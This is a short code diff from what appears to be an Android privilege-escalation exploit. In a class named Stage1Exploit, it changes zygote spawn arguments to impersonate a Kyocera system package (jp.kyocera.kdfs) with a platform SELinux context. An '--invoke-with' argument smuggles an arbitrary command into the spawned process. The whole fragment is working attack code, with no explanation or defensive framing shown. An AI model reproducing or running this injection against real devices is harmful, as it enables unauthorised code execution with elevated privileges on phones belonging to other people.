@@ -191,10 +191,11 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=webview_zygote",
+            "--app-data-dir=/data/data/jp.kyocera.kdfs",
+            "--nice-name=jp.kyocera.kdfs",
             "--target-sdk-version=28",
+            "--seinfo=platform:kdfs_svc",
             "--runtime-flags=1",
-            "--nice-name=webview_zygote",
             "--invoke-with",
             f"{command}#",
         ]
